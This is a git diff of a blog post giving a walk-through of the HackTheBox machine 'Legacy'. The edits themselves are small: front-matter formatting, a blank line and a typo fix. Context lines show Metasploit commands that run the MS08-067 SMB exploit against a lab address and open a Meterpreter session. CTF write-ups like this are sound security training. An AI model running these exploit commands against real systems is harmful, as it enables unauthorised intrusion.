@@ -1,6 +1,7 @@
 ---
 title: "Walk-through of Legacy from HackTheBox"
-teaser: /assets/images/2020-05-05-22-13-16.png
+header:
+  teaser: /assets/images/2020-05-05-22-13-16.png
 toc: true
 toc_sticky: true
 excerpt_separator:  <!--more-->
@@ -105,6 +106,7 @@ Exploit target:
    Id  Name
    --  ----
    0   Automatic Targeting
+
 msf5 exploit(windows/smb/ms08_067_netapi) > set RHOST 10.10.10.4
 RHOST => 10.10.10.4
 msf5 exploit(windows/smb/ms08_067_netapi) > exploit
@@ -119,7 +121,7 @@ msf5 exploit(windows/smb/ms08_067_netapi) > exploit
 
 ### User and Root Flags
 
-Meterpreter session connected, take a look at look around:
+Meterpreter session connected, take a look around:
 
 ```text
 meterpreter > sysinfo
